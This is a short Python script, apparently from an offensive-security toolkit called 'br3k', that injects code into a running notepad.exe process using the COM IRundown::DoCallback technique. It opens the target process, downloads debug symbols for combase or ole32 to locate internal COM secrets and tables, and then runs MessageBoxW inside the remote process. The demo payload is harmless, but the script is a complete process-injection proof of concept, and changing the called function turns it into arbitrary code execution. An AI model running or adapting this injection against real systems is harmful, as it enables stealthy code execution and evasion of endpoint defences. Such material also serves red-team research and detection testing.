import br3k
from br3k import ProcessOpenStrategy, ProcessVmStrategy

PROCESS_NAME = "notepad.exe"

if __name__ == "__main__":
    print("Script: Inject via COM IRundown::DoCallback()")
    print()

    br3k.init_sysapi()

    process = br3k.Process(
        name=PROCESS_NAME,
        memory_strategy=ProcessVmStrategy.AllocateInAddr,
        process_open_strategy=ProcessOpenStrategy.OpenProcess
    )

    process.open()
    process.init_memory()

    com_dll = br3k.get_module_handle(module_name="combase")
    if com_dll is None:
        com_dll = br3k.get_module_handle(module_name="ole32")
    if com_dll is None:
        raise Exception("unable to get COM DLL handle")

    com_dll_image = br3k.Pe(data = com_dll, is_file=False)

    temp_path = br3k.fs_get_temp_folder()
    com_dll_pdb_path = br3k.pdb_download(folder_path=temp_path, pe=com_dll_image)
    pdb = br3k.Pdb(filepath=com_dll_pdb_path)

    irundown = br3k.ComIRundown(
        process=process,
        ole32_address=com_dll,
        ole32_secret_rva=pdb.get_symbol_rva("CProcessSecret::s_guidOle32Secret"),
        ole32_palloc_rva=pdb.get_symbol_rva("CIPIDTable::_palloc"),
        ole32_emptyctx_rva=pdb.get_symbol_rva("g_pMTAEmptyCtx"),
        moxid_offset=pdb.get_field_offset("OXIDEntry", "_moxid"),
    )

    pfn_messagebox = br3k.get_proc_address("user32.dll", "MessageBoxW")

    irundown.read_ipid_entries()
    irundown.execute(ep=pfn_messagebox, arg1=0)

    br3k.script_success()
